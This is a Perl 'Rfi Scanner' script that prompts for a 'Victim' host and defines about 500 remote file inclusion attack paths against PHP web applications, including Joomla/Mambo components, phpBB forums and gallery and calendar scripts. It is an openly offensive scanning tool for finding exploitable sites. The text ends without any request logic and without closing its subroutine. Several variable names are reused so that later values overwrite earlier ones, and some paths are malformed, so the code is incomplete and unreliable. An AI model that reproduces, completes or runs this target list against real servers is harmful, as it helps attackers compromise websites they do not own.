#!/usr/bin/perl
use HTTP::Request;
use LWP::UserAgent;

&inizio;
sub inizio{
print q(
     Rfi Scanner
     Authors - The[Boss] / Haroon Awan

);
print "[>] Enter Victim: ";
$host=<STDIN>;
chomp($host);
print "[>] Ok lets scan\n";
$rfi1="includes/header.php?systempath=";
$rfi2="Gallery/displayCategory.php?basepath=";
$rfi3="index.inc.php?PATH_Includes=";
$rfi4="nphp/nphpd.php?nphp_config[LangFile]=";
$rfi5="include/db.php?GLOBALS[rootdp]=";
$rfi6="ashnews.php?pathtoashnews=";
$rfi7="ashheadlines.php?pathtoashnews=";
$rfi8="modules/xgallery/upgrade_album.php?GALLERY_BASEDIR=";
$rfi9="demo/includes/init.php?user_inc=";
$rfi10="jaf/index.php?show=";
$rfi11="inc/shows.inc.php?cutepath=";
$rfi12="poll/admin/common.inc.php?base_path=";
$rfi13="pollvote/pollvote.php?pollname=";
$rfi14="sources/post.php?fil_config=";
$rfi15="modules/My_eGallery/public/displayCategory.php?basepath=";
$rfi16="bb_lib/checkdb.inc.php?libpach=";
$rfi17="include/livre_include.php?no_connect=lol&chem_absolu=";
$rfi18="index.php?from_market=Y&pageurl=";
$rfi19="modules/mod_mainmenu.php?mosConfig_absolute_path=";
$rfi20="pivot/modules/module_db.php?pivot_path=";
$rfi21="modules/4nAlbum/public/displayCategory.php?basepath=";
$rfi22="derniers_commentaires.php?rep=";
$rfi23="modules/coppermine/themes/default/theme.php?THEME_DIR=";
$rfi24="modules/coppermine/include/init.inc.php?CPG_M_DIR=";
$rfi25="modules/coppermine/themes/coppercop/theme.php?THEME_DIR=";
$rfi26="coppermine/themes/maze/theme.php?THEME_DIR=";
$rfi28="allmylinks/include/footer.inc.php?_AMLconfig[cfg_serverpath]=";
$rfi29="allmylinks/include/info.inc.php?_AMVconfig[cfg_serverpath]=";
$rfi30="myPHPCalendar/admin.php?cal_dir=";
$rfi31="agendax/addevent.inc.php?agendax_path=";
$rfi32="modules/mod_mainmenu.php?mosConfig_absolute_path=";
$rfi33="modules/PNphpBB2/includes/functions_admin.php?phpbb_root_path=";
$rfi34="main.php?page=";
$rfi35="default.php?page=";
$rfi36="index.php?action=";
$rfi37="index1.php?p=";
$rfi38="index2.php?x=";
$rfi39="index2.php?content=";
$rfi40="index.php?conteudo=";
$rfi41="index.php?cat=";
$rfi42="include/new-visitor.inc.php?lvc_include_dir=";
$rfi43="modules/agendax/addevent.inc.php?agendax_path=";
$rfi44="shoutbox/expanded.php?conf=";
$rfi45="modules/xgallery/upgrade_album.php?GALLERY_BASEDIR=";
$rfi46="pivot/modules/module_db.php?pivot_path=";
$rfi47="library/editor/editor.php?root=";
$rfi48="library/lib.php?root=";
$rfi49="e107/e107_handlers/secure_img_render.php?p=";
$rfi50="zentrack/index.php?configFile=";
$rfi51="main.php?x=";
$rfi52="becommunity/community/index.php?pageurl=";
$rfi53="GradeMap/index.php?page=";
$rfi54="phpopenchat/contrib/yabbse/poc.php?sourcedir=";
$rfi55="calendar/calendar.php?serverPath=";
$rfi56="calendar/functions/popup.php?serverPath=";
$rfi57="calendar/events/header.inc.php?serverPath=";
$rfi58="calendar/events/datePicker.php?serverPath=";
$rfi59="calendar/setup/setupSQL.php?serverPath=";
$rfi60="calendar/setup/header.inc.php?serverPath=";
$rfi61="mwchat/libs/start_lobby.php?CONFIG[MWCHAT_Libs]=";
$rfi62="zentrack/index.php?configFile=";
$rfi63="pivot/modules/module_db.php?pivot_path=";
$rfi64="inc/header.php/step_one.php?server_inc=";
$rfi65="install/index.php?lng=../../include/main.inc&G_PATH=";
$rfi66="inc/pipe.php?HCL_path=";
$rfi67="include/write.php?dir=";
$rfi68="include/new-visitor.inc.php?lvc_include_dir=";
$rfi69="includes/header.php?systempath=";
$rfi70="support/mailling/maillist/inc/initdb.php?absolute_path=";
$rfi71="coppercop/theme.php?THEME_DIR=";
$rfi72="zentrack/index.php?configFile=";
$rfi73="pivot/modules/module_db.php?pivot_path=";
$rfi74="inc/header.php/step_one.php?server_inc=";
$rfi75="install/index.php?lng=../../include/main.inc&G_PATH=";
$rfi76="inc/pipe.php?HCL_path=";
$rfi77="include/write.php?dir=";
$rfi78="include/new-visitor.inc.php?lvc_include_dir=";
$rfi79="includes/header.php?systempath=";
$rfi80="support/mailling/maillist/inc/initdb.php?absolute_path=";
$rfi81="coppercop/theme.php?THEME_DIR=";
$rfi82="becommunity/community/index.php?pageurl=";
$rfi83="shoutbox/expanded.php?conf=";
$rfi84="agendax/addevent.inc.php?agendax_path=";
$rfi85="myPHPCalendar/admin.php?cal_dir=";
$rfi86="yabbse/Sources/Packages.php?sourcedir=";
$rfi87="dotproject/modules/projects/addedit.php?root_dir=";
$rfi88="dotproject/modules/projects/view.php?root_dir=";
$rfi89="dotproject/modules/projects/vw_files.php?root_dir=";
$rfi90="dotproject/modules/tasks/addedit.php?root_dir=";
$rfi91="dotproject/modules/tasks/viewgantt.php?root_dir=";
$rfi92="My_eGallery/public/displayCategory.php?basepath=";
$rfi93="modules/My_eGallery/public/displayCategory.php?basepath=";
$rfi94="modules/4nAlbum/public/displayCategory.php?basepath=";
$rfi95="modules/coppermine/themes/default/theme.php?THEME_DIR=";
$rfi96="modules/agendax/addevent.inc.php?agendax_path=";
$rfi97="modules/xoopsgallery/upgrade_album.php?GALLERY_BASEDIR=";
$rfi98="modules/xgallery/upgrade_album.php?GALLERY_BASEDIR=";
$rfi99="modules/coppermine/include/init.inc.php?CPG_M_DIR=";
$rfi100="modules/mod_mainmenu.php?mosConfig_absolute_path=";
$rfi101="shoutbox/expanded.php?conf=";
$rfi102="pivot/modules/module_db.php?pivot_path=";
$rfi103="library/editor/editor.php?root=";
$rfi104="library/lib.php?root=";
$rfi105="e107/e107_handlers/secure_img_render.php?p=";
$rfi106="main.php?x=";
$rfi107="main.php?page=";
$rfi108="index.php?meio.php=";
$rfi109="index.php?include=";
$rfi110="index.php?inc=";
$rfi111="index.php?page=";
$rfi112="index.php?pag=";
$rfi113="index.php?p=";
$rfi114="index.php?x=";
$rfi115="index.php?open=";
$rfi116="index.php?visualizar=";
$rfi117="index.php?pagina=";
$rfi118="index2.php?content=";
$rfi119="inc/step_one_tables.php?server_inc=";
$rfi120="GradeMap/index.php?page=";
$rfi121="phpshop/index.php?base_dir=";
$rfi122="admin.php?cal_dir=";
$rfi123="contacts.php?cal_dir=";
$rfi124="convert-date.php?cal_dir=";
$rfi125="album_portal.php?phpbb_root_path=";
$rfi126="mainfile.php?MAIN_PATH=";
$rfi127="dotproject/modules/files/index_table.php?root_dir=";
$rfi128="html/affich.php?base=";
$rfi129="gallery/init.php?HTTP_POST_VARS=";
$rfi130="pm/lib.inc.php?pm_path=";
$rfi131="ideabox/include.php?gorumDir=";
$rfi132="index2.php?includes_dir=";
$rfi133="forums/toplist.php?phpbb_root_path=";
$rfi134="forum/toplist.php?phpbb_root_path=";
$rfi135="admin/config_settings.tpl.php?include_path=";
$rfi136="include/common.php?include_path=";
$rfi137="event/index.php?page=";
$rfi138="forum/index.php?includeFooter=";
$rfi139="forums/index.php?includeFooter=";
$rfi140="forum/bb_admin.php?includeFooter=";
$rfi141="forums/bb_admin.php?includeFooter=";
$rfi142="language/lang_english/lang_activity.php?phpbb_root_path=";
$rfi143="forum/language/lang_english/lang_activity.php?phpbb_root_path=";
$rfi144="blend_data/blend_common.php?phpbb_root_path=";
$rfi145="master.php?root_path=";
$rfi146="includes/kb_constants.php?module_root_path=";
$rfi147="forum/includes/kb_constants.php?module_root_path=";
$rfi148="forums/includes/kb_constants.php?module_root_path=";
$rfi149="classes/adodbt/sql.php?classes_dir=";
$rfi150="agenda.php3?rootagenda=";
$rfi151="agenda2.php3?rootagenda=";
$rfi152="sources/lostpw.php?CONFIG[path]=";
$rfi153="topsites/sources/lostpw.php?CONFIG[path]=";
$rfi154="toplist/sources/lostpw.php?CONFIG[path]=";
$rfi155="sources/join.php?CONFIG[path]=";
$rfi156="topsites/sources/join.php?CONFIG[path]=";
$rfi157="toplist/sources/join.php?CONFIG[path]=";
$rfi158="topsite/sources/join.php?CONFIG[path]=";
$rfi159="public_includes/pub_popup/popup_finduser.php?vsDragonRootPath=";
$rfi160="extras/poll/poll.php?file_newsportal=";
$rfi161="index.php?site_path=";
$rfi162="mail/index.php?site_path=";
$rfi163="fclick/show.php?path=";
$rfi164="show.php?path=";
$rfi165="calogic/reconfig.php?GLOBALS[CLPath]=";
$rfi166="eshow.php?Config_rootdir=";
$rfi167="auction/auction_common.php?phpbb_root_path=";
$rfi168="index.php?inc_dir=";
$rfi169="calendar/index.php?inc_dir=";
$rfi170="modules/TotalCalendar/index.php?inc_dir=";
$rfi171="modules/calendar/index.php?inc_dir=";
$rfi172="calendar/embed/day.php?path=";
$rfi173="ACalendar/embed/day.php?path=";
$rfi174="calendar/add_event.php?inc_dir=";
$rfi175="claroline/auth/extauth/drivers/ldap.inc.php?clarolineRepositorySys=";
$rfi176="claroline/auth/ldap/authldap.php?includePath=";
$rfi177="docebo/modules/credits/help.php?lang=";
$rfi178="modules/credits/help.php?lang=";
$rfi179="config.php?returnpath=";
$rfi180="editsite.php?returnpath=";
$rfi181="in.php?returnpath=";
$rfi182="addsite.php?returnpath=";
$rfi183="includes/pafiledb_constants.php?module_root_path=";
$rfi184="phpBB/includes/pafiledb_constants.php?module_root_path=";
$rfi185="pafiledb/includes/pafiledb_constants.php?module_root_path=";
$rfi186="auth/auth.php?phpbb_root_path=";
$rfi187="auth/auth_phpbb/phpbb_root_path=";
$rfi188="apc-aa/cron.php3?GLOBALS[AA_INC_PATH]=";
$rfi189="apc-aa/cached.php3?GLOBALS[AA_INC_PATH]=";
$rfi190="infusions/last_seen_users_panel/last_seen_users_panel.php?settings[locale]=";
$rfi191="phpdig/includes/config.php?relative_script_path=";
$rfi192="includes/phpdig/includes/config.php?relative_script_path=";
$rfi193="includes/dbal.php?eqdkp_root_path=";
$rfi194="eqdkp/includes/dbal.php?eqdkp_root_path=";
$rfi195="dkp/includes/dbal.php?eqdkp_root_path=";
$rfi196="include/SQuery/gameSpy2.php?libpath=";
$rfi197="include/global.php?GLOBALS[includeBit]=";
$rfi198="topsites/config.php?returnpath=";
$rfi199="manager/frontinc/prepend.php?_PX_config[manager_path]=";
$rfi200="ubbthreads/addpost_newpoll.php?addpoll=thispath=";
$rfi201="forum/addpost_newpoll.php?thispath=";
$rfi202="forums/addpost_newpoll.php?thispath=";
$rfi203="ubbthreads/ubbt.inc.php?thispath=";
$rfi204="forums/ubbt.inc.php?thispath=";
$rfi205="forum/ubbt.inc.php?thispath=";
$rfi206="forum/admin/addentry.php?phpbb_root_path=";
$rfi207="admin/addentry.php?phpbb_root_path=";
$rfi208="index.php?f=";
$rfi209="index.php?act=";
$rfi210="ipchat.php?root_path=";
$rfi211="includes/orderSuccess.inc.php?glob[rootDir]=";
$rfi212="stats.php?dir[func]=dir[base]=";
$rfi213="ladder/stats.php?dir[base]=";
$rfi214="ladders/stats.php?dir[base]=";
$rfi215="sphider/admin/configset.php?settings_dir=";
$rfi216="admin/configset.php?settings_dir=";
$rfi217="vwar/admin/admin.php?vwar_root=";
$rfi218="modules/vwar/admin/admin.php?vwar_root=";
$rfi219="modules/vWar_Account/includes/get_header.php?vwar_root=";
$rfi220="modules/vWar_Account/includes/functions_common.php?vwar_root2=";
$rfi221="sphider/admin/configset.php?settings_dir=";
$rfi222="admin/configset.php?settings_dir=";
$rfi223="impex/ImpExData.php?systempath=";
$rfi224="forum/impex/ImpExData.php?systempath=";
$rfi225="forums/impex/ImpExData.php?systempath=";
$rfi226="application.php?base_path=";
$rfi227="index.php?theme_path=";
$rfi228="become_editor.php?theme_path=";
$rfi229="add.php?theme_path=";
$rfi230="bad_link.php?theme_path=";
$rfi231="browse.php?theme_path=";
$rfi232="detail.php?theme_path=";
$rfi233="fav.php?theme_path=";
$rfi234="get_rated.php?theme_path=";
$rfi235="login.php?theme_path=";
$rfi236="mailing_list.php?theme_path=";
$rfi237="new.php?theme_path=";
$rfi238="modify.php?theme_path=";
$rfi239="pick.php?theme_path=";
$rfi240="power_search.php?theme_path=";
$rfi241="rating.php?theme_path=";
$rfi242="register.php?theme_path=";
$rfi243="review.php?theme_path=";
$rfi244="rss.php?theme_path=";
$rfi245="search.php?theme_path=";
$rfi246="send_pwd.php?theme_path=";
$rfi247="sendmail.php?theme_path=";
$rfi248="tell_friend.php?theme_path=";
$rfi249="top_rated.php?theme_path=";
$rfi250="user_detail.php?theme_path=";
$rfi251="user_search.php?theme_path=";
$rfi252="invoice.php?base_path=";
$rfi253="cgi-bin//classes/adodbt/sql.php?classes_dir=";
$rfi254="cgi-bin/install/index.php?G_PATH=";
$rfi255="cgi-bin/include/print_category.php?dir=";
$rfi256="includes/class_template.php?quezza_root_path=";
$rfi257="bazar/classified_right.php?language_dir=";
$rfi258="classified_right.php?language_dir=";
$rfi259="phpBazar/classified_right.php?language_dir=";
$rfi260="chat/messagesL.php3?cmd=";
$rfi261="phpMyChat/chat/messagesL.php3?cmd=";
$rfi262="bbs/include/write.php?dir=";
$rfi263="visitorupload.php?cmd=";
$rfi264="modules/center/admin/accounts/process.php?module_path]=";
$rfi265="index.php?template=";
$rfi266="armygame.php?libpath=";
$rfi267="lire.php?rub=";
$rfi268="pathofhostadmin/?page=";
$rfi269="apa_phpinclude.inc.php?apa_module_basedir=";
$rfi270="index.php?req_path=";
$rfi271="research/boards/encapsbb-0.3.2_fixed/index_header.php?root=";
$rfi272="Farsi1/index.php?archive=";
$rfi273="index.php?archive=";
$rfi274="show_archives.php?template=";
$rfi275="forum/include/common.php?pun_root=";
$rfi276="pmwiki wiki/pmwiki-2.1.beta20/pmwiki.php?GLOBALS[FarmD]=";
$rfi277="vuln.php?=";
$rfi278="cgi-bin//include/write.php?dir=";
$rfi279="admin/common.inc.php?basepath=";
$rfi280="pm/lib.inc.php?sfx=";
$rfi281="pm/lib.inc.php?pm_path=";
$rfi282="artmedic-kleinanzeigen-path/index.php?id=";
$rfi283="osticket/include/main.php?include_dir=";
$rfi284="include/main.php?config[search_disp]=include_dir=";
$rfi285="phpcoin/config.php?_CCFG[_PKG_PATH_DBSE]=";
$rfi286="quick_reply.php?phpbb_root_path=";
$rfi287="zboard/include/write.php?dir=";
$rfi288="admin/plog-admin-functions.php?configbasedir=";
$rfi289="content.php?content=";
$rfi290="q-news.php?id=";
$rfi291="_conf/core/common-tpl-vars.php?confdir=";
$rfi292="votebox.php?VoteBoxPath=";
$rfi293="al_initialize.php?alpath=";
$rfi294="include/db.php?GLOBALS[rootdp]=";
$rfi295="modules/news/archivednews.php?GLOBALS[language_home]=";
$rfi296="protection.php?siteurl=";
$rfi297="modules/AllMyGuests/signin.php?_AMGconfig[cfg_serverpath]=";
$rfi298="index2.php?includes_dir=";
$rfi299="classes.php?LOCAL_PATH=";
$rfi300="extensions/moblog/moblog_lib.php?basedir=";
$rfi301="modules/newbb_plus/class/forumpollrenderer.php?bbPath[path]=";
$rfi302="phpWebLog/include/init.inc.php?G_PATH=";
$rfi303="admin/objects.inc.php4?Server=";
$rfi304="trg_news30/trgnews/install/article.php?dir=";
$rfi305="block.php?Include=";
$rfi306="arpuivo.php?data=";
$rfi307="setup/index.php?GALLERY_BASEDIR=";
$rfi308="include/help.php?base=";
$rfi309="index.php?[Home]=";
$rfi310="block.php?Include=";
$rfi311="examples/phonebook.php?page=";
$rfi312="PHPNews/auth.php?path=";
$rfi313="include/print_category.php?dir=";
$rfi314="skin/zero_vote/login.php?dir=";
$rfi315="skin/zero_vote/setup.php?dir=";
$rfi316="skin/zero_vote/ask_password.php?dir=";
$rfi317="gui/include/sql.php?include_path=";
$rfi318="webmail/lib/emailreader_execute_on_each_page.inc.php?emailreader_ini=";
$rfi319="email.php?login=cer_skin=";
$rfi320="PhotoGal/ops/gals.php?news_file=";
$rfi321="index.php?custom=";
$rfi322="loginout.php?cutepath=";
$rfi323="oneadmin/config.php?path[docroot]=";
$rfi324="xcomic/initialize.php?xcomicRootPath=";
$rfi325="skin/zero_vote/setup.php?dir=";
$rfi326="skin/zero_vote/error.php? dir=";
$rfi327="admin_modules/admin_module_captions.inc.php?config[path_src_include]=";
$rfi328="admin_modules/admin_module_rotimage.inc.php?config[path_src_include]=";
$rfi329="admin_modules/admin_module_delcomments.inc.php?config[path_src_include]=";
$rfi330="admin_modules/admin_module_edit.inc.php?config[path_src_include]=";
$rfi331="admin_modules/admin_module_delimage.inc.php?config[path_src_include]=";
$rfi332="admin_modules/admin_module_deldir.inc.php?config[path_src_include]=";
$rfi333="src/index_overview.inc.php?config[path_src_include]=";
$rfi334="src/index_leftnavbar.inc.php?config[path_src_include]=";
$rfi335="src/index_image.inc.php?config[path_src_include]=";
$rfi336="src/image-gd.class.php?config[path_src_include]=";
$rfi337="src/image.class.php?config[path_src_include]=";
$rfi338="src/album.class.php?config[path_src_include]=";
$rfi339="src/show_random.inc.php?config[path_src_include]=";
$rfi340="src/main.inc.php?config[path_src_include]=";
$rfi341="src/index_passwd-admin.inc.php?config[path_admin_include]=";
$rfi342="yappa-ng/src/index_overview.inc.php?config[path_src_include]=";
$rfi343="admin_modules/admin_module_captions.inc.php?config[path_src_include]=";
$rfi344="admin_modules/admin_module_rotimage.inc.php?config[path_src_include]=";
$rfi345="admin_modules/admin_module_delcomments.inc.php?config[path_src_include]=";
$rfi346="admin_modules/admin_module_edit.inc.php?config[path_src_include]=";
$rfi347="admin_modules/admin_module_delimage.inc.php?config[path_src_include]=";
$rfi348="admin_modules/admin_module_deldir.inc.php?config[path_src_include]=";
$rfi349="src/index_overview.inc.php?config[path_src_include]=";
$rfi350="src/image-gd.class.php?config[path_src_include]=";
$rfi351="src/image.class.php?config[image_module]=";
$rfi352="src/album.class.php?config[path_src_include]=";
$rfi353="src/show_random.inc.php?config[path_src_include]=";
$rfi353="src/main.inc.php?config[path_src_include]=";
$rfi354="includes/db_adodb.php?baseDir=";
$rfi355="includes/db_connect.php?baseDir=";
$rfi356="includes/session.php?baseDir=";
$rfi357="modules/projects/gantt.php?dPconfig[root_dir]=";
$rfi358="modules/projects/gantt2.php?dPconfig[root_dir]=";
$rfi359="modules/projects/vw_files.php?dPconfig[root_dir]=";
$rfi360="modules/admin/vw_usr_roles.php?baseDir=";
$rfi361="modules/public/calendar.php?baseDir=";
$rfi362="modules/public/date_format.php?baseDir=";
$rfi363="modules/tasks/gantt.php?baseDir=";
$rfi364="mantis/login_page.php?g_meta_include_file=";
$rfi365="phpgedview/help_text_vars.php?PGV_BASE_DIRECTORY=";
$rfi366="modules/My_eGallery/public/displayCategory.php?basepath=";
$rfi367="dotproject/modules/files/index_table.php?root_dir=";
$rfi368="nukebrowser.php?filnavn=";
$rfi369="bug_sponsorship_list_view_inc.php?t_core_path=";
$rfi370="modules/coppermine/themes/coppercop/theme.php?THEME_DIR=";
$rfi371="modules/coppermine/themes/maze/theme.php?THEME_DIR=";
$rfi372="modules/coppermine/include/init.inc.php?CPG_M_DIR=";
$rfi373="includes/calendar.php?phpc_root_path=";
$rfi374="includes/setup.php?phpc_root_path=";
$rfi375="phpBB/admin/admin_styles.php?mode=";
$rfi376="aMember/plugins/db/mysql/mysql.inc.php?config=";
$rfi377="admin/lang.php?CMS_ADMIN_PAGE=";
$rfi378="inc/pipe.php?HCL_path=";
$rfi379="include/write.php?dir=";
$rfi380="becommunity/community/index.php?pageurl=";
$rfi381="modules/xoopsgallery/upgrade_album.php?GALLERY_BASEDIR=";
$rfi382="modules/mod_mainmenu.php?mosConfig_absolute_path=";
$rfi383="modules/agendax/addevent.inc.php?agendax_path=";
$rfi384="shoutbox/expanded.php?conf=";
$rfi385="modules/xgallery/upgrade_album.php?GALLERY_BASEDIR=";
$rfi386="index.php?page=";
$rfi387="index.php?pag=";
$rfi388="index.php?include=";
$rfi389="index.php?content=";
$rfi390="index.php?cont=";
$rfi391="index.php?c=";
$rfi392="modules/My_eGallery/index.php?basepath=";
$rfi393="modules/newbb_plus/class/forumpollrenderer.php?bbPath=";
$rfi394="journal.php?m=";
$rfi395="index.php?m=";
$rfi396="links.php?c=";
$rfi397="forums.php?m=";
$rfi398="list.php?c=";
$rfi399="user.php?xoops_redirect=";
$rfi400="index.php?id=";
$rfi401="r.php?url=";
$rfi402="CubeCart/includes/orderSuccess.inc.php?&glob[rootDir]=";
$rfi403="inc/formmail.inc.php?script_root=";
$rfi404="include/init.inc.php?G_PATH=";
$rfi405="backend/addons/links/index.php?PATH=";
$rfi406="modules/newbb_plus/class/class.forumposts.php?bbPath[path]=";
$rfi407="modules/newbb_plus/class/forumpollrenderer.php?bbPath[path]=";
$rfi408="protection.php?siteurl=";
$rfi409="htmltonuke.php?filnavn=";
$rfi410="mail_autocheck.php?pm_path=";
$rfi411="index.php?p=";
$rfi412="modules/4nAlbum/public/displayCategory.php?basepath=";
$rfi413="e107/e107_handlers/secure_img_render.php?p=";
$rfi414="include/new-visitor.inc.php?lvc_include_dir=";
$rfi415="community/modules/agendax/addevent.inc.php?agendax_path=";
$rfi416="library/editor/editor.php?root=";
$rfi417="library/lib.php?root=";
$rfi418="zentrack/index.php?configFile=";
$rfi419="pivot/modules/module_db.php?pivot_path=";
$rfi420="myPHPCalendar/admin.php?cal_dir=";
$rfi421="index.php/main.php?x=";
$rfi422="os/pointer.php?url=";
$rfi423="p_uppc_francais/pages_php/p_aidcon_conseils/index.php?FM=";
$rfi424="db.php?path_local=";
$rfi425="phpGedView/individual.php?PGV_BASE_DIRECTORY=";
$rfi426="index.php?kietu[url_hit]=";
$rfi427="phorum/plugin/replace/plugin.php?PHORUM[settings_dir]=";
$rfi428="Sources/Packages.php?sourcedir=";
$rfi429="modules/PNphpBB2/includes/functions_admin.php?phpbb_root_path=";
$rfi430="cgi-bin//gadgets/Blog/BlogModel.php?path=";
$rfi431="/components/com_flyspray/startdown.php?file=";
$rfi432="/administrator/components/com_admin/admin.admin.html.php?mosConfig_absolute_path=";
$rfi433="/components/com_simpleboard/file_upload.php?sbp=";
$rfi434="/components/com_hashcash/server.php?mosConfig_absolute_path=";
$rfi435="/components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?mosConfig_absolute_path=";
$rfi436="/components/com_sitemap/sitemap.xml.php?mosConfig_absolute_path=";
$rfi437="/components/com_performs/performs.php?mosConfig_absolute_path=";
$rfi438="/components/com_forum/download.php?phpbb_root_path=";
$rfi439="/components/com_pccookbook/pccookbook.php?mosConfig_absolute_path=";
$rfi440="/components/com_extcalendar/extcalendar.php?mosConfig_absolute_path=";
$rfi441="/components/minibb/index.php?absolute_path=";
$rfi442="/components/com_smf/smf.php?mosConfig_absolute_path=";
$rfi443="/modules/mod_calendar.php?absolute_path=";
$rfi444="/components/com_pollxt/conf.pollxt.php?mosConfig_absolute_path=";
$rfi445="/components/com_loudmounth/includes/abbc/abbc.class.php?mosConfig_absolute_path=";
$rfi446="/components/com_videodb/core/videodb.class.xml.php?mosConfig_absolute_path=";
$rfi447="/components/com_pcchess/include.pcchess.php?mosConfig_absolute_path=";
$rfi448="/administrator/components/com_multibanners/extadminmenus.class.php?mosConfig_absolute_path=";
$rfi449="/administrator/components/com_a6mambohelpdesk/admin.a6mambohelpdesk.php?mosConfig_live_site=";
$rfi450="/administrator/components/com_colophon/admin.colophon.php?mosConfig_absolute_path=";
$rfi451="/administrator/components/com_mgm/help.mgm.php?mosConfig_absolute_path=";
$rfi452="/components/com_mambatstaff/mambatstaff.php?mosConfig_absolute_path=";
$rfi453="/components/com_securityimages/configinsert.php?mosConfig_absolute_path=";
$rfi454="/components/com_securityimages/lang.php?mosConfig_absolute_path=";
$rfi455="/components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=";
$rfi456="/components/com_galleria/galleria.html.php?mosConfig_absolute_path=";
$rfi457="/akocomments.php?mosConfig_absolute_path=";
$rfi458="/administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir=";
$rfi459="/administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=";
$rfi460="/administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path=";
$rfi461="/components/com_zoom/classes/fs_unix.php?mosConfig_absolute_path=";
$rfi462="/components/com_zoom/includes/database.php?mosConfig_absolute_path=";
$rfi463="/administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path=";
$rfi464="/components/com_fm/fm.install.php?lm_absolute_path=";
$rfi465="/administrator/components/com_mambelfish/mambelfish.class.php?mosConfig_absolute_path=";
$rfi466="/components/com_lmo/lmo.php?mosConfig_absolute_path=";
$rfi467="/administrator/components/com_webring/admin.webring.docs.php?component_dir=";
$rfi468="/administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path=";
$rfi469="/administrator/components/com_babackup/classes/Tar.php?mosConfig_absolute_path=";
$rfi470="/administrator/components/com_lurm_constructor/admin.lurm_constructor.php?lm_absolute_path=";
$rfi471="/components/com_mambowiki/MamboLogin.php?IP=";
$rfi472="/administrator/components/com_a6mambocredits/admin.a6mambocredits.php?mosConfig_live_site=";
$rfi473="/administrator/components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path=";
$rfi474="/components/com_cpg/cpg.php?mosConfig_absolute_path=";
$rfi475="/components/com_moodle/moodle.php?mosConfig_absolute_path=";
$rfi476="/components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path=";
$rfi477="/components/com_mospray/scripts/admin.php?basedir=";
$rfi478="/administrator/components/com_uhp/uhp_config.php?mosConfig_absolute_path=";
$rfi479="/administrator/components/com_peoplebook/param.peoplebook.php?mosConfig_absolute_path=";
$rfi480="/administrator/components/com_mmp/help.mmp.php?mosConfig_absolute_path=";
$rfi480="/components/com_reporter/processor/reporter.sql.php?mosConfig_absolute_path=";
$rfi481="/components/com_madeira/img.php?url=";
$rfi482="/components/com_bsq_sitestats/external/rssfeed.php?baseDir=";
$rfi483="/com_bsq_sitestats/external/rssfeed.php?baseDir=";
$rfi484="/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=";
$rfi485="/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=";
$rfi486="/administrator/components/admin.jjgallery.php?mosConfig_absolute_path=";
$rfi487="/components/com_jreviews/scripts/xajax.inc.php?mosConfig_absolute_path=";
$rfi488="/com_directory/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=";
$rfi489="/administrator/components/com_chronocontact/excelwriter/PPS/File.php?mosConfig_absolute_path=";
$rfi490="/administrator/components/com_chronocontact/excelwriter/Writer.php?mosConfig_absolute_path=";
$rfi491="/administrator/components/com_chronocontact/excelwriter/PPS.php?mosConfig_absolute_path=";
$rfi492="/administrator/components/com_chronocontact/excelwriter/Writer/BIFFwriter.php?mosConfig_absolute_path=";
$rfi493="/administrator/components/com_chronocontact/excelwriter/Writer/Workbook.php?mosConfig_absolute_path=";
$rfi494="/administrator/components/com_chronocontact/excelwriter/Writer/Worksheet.php?mosConfig_absolute_path=";
$rfi495="/administrator/components/com_chronocontact/excelwriter/Writer/Format.php?mosConfig_absolute_path=";
$rfi496="/index.php?option=com_custompages&cpage=";
$rfi497="/component/com_onlineflashquiz/quiz/common/db_config.inc.php?base_dir=";
$rfi498="/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=";
$rfi499="/components/com_facileforms/facileforms.frame.php?ff_compath=";
$rfi500="/administrator/components/com_rssreader/admin.rssreader.php?mosConfig_live_site=";
$rfi501="/administrator/components/com_feederator/includes/tmsp/add_tmsp.php?mosConfig_absolute_path=";
$rfi502="/administrator/components/com_feederator/includes/tmsp/edit_tmsp.php?mosConfig_absolute_path=";
$rfi503="/administrator/components/com_feederator/includes/tmsp/subscription.php?GLOBALS[mosConfig_absolute_path]=";
$rfi504="/administrator/components/com_feederator/includes/tmsp/tmsp.php?mosConfig_absolute_path=";
$rfi505="/administrator/components/com_clickheat/install.clickheat.php?GLOBALS[mosConfig_absolute_path]=";
$rfi506="/administrator/components/com_clickheat/includes/heatmap/_main.php?mosConfig_absolute_path=";
$rfi507="/administrator/components/com_clickheat/includes/heatmap/main.php?mosConfig_absolute_path=";
$rfi508="/administrator/components/com_clickheat/includes/overview/main.php?mosConfig_absolute_path=";
$rfi509="/administrator/components/com_clickheat/Recly/Clickheat/Cache.php?GLOBALS[mosConfig_absolute_path]=";
$rfi500="/administrator/components/com_clickheat/Recly/Clickheat/Clickheat_Heatmap.php?GLOBALS[mosConfig_absolute_path]=";
$rfi501="/administrator/components/com_clickheat/Recly/common/GlobalVariables.php?GLOBALS[mosConfig_absolute_path]=";
$rfi502="/administrator/components/com_competitions/includes/competitions/add.php?GLOBALS[mosConfig_absolute_path]=";
$rfi503="/administrator/components/com_competitions/includes/competitions/competitions.php?GLOBALS[mosConfig_absolute_path]=";
$rfi504="/administrator/components/com_competitions/includes/settings/settings.php?mosConfig_absolute_path=";
$rfi505="/administrator/components/com_dadamail/config.dadamail.php?GLOBALS['mosConfig_absolute_path']=";
$rfi506="/administrator/components/com_googlebase/admin.googlebase.php?mosConfig_absolute_path=";
$rfi507="/administrator/components/com_ongumatimesheet20/lib/onguma.class.php?mosConfig_absolute_path=";
$rfi508="/administrator/components/com_treeg/admin.treeg.php?mosConfig_live_site=";
$rfi509="/administrator/components/com_bayesiannaivefilter/lang.php?mosConfig_absolute_path=";
$rfi510="/components/com_jd-wiki/lib/tpl/default/main.php?mosConfig_absolute_path=";
$rfi511="/administrator/components/com_jim/install.jim.php?mosConfig_absolute_path=";
$rfi512="/components/com_mtree/Savant2/Savant2_Plugin_textarea.php?mosConfig_absolute_path=";
$rfi513="/components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=";
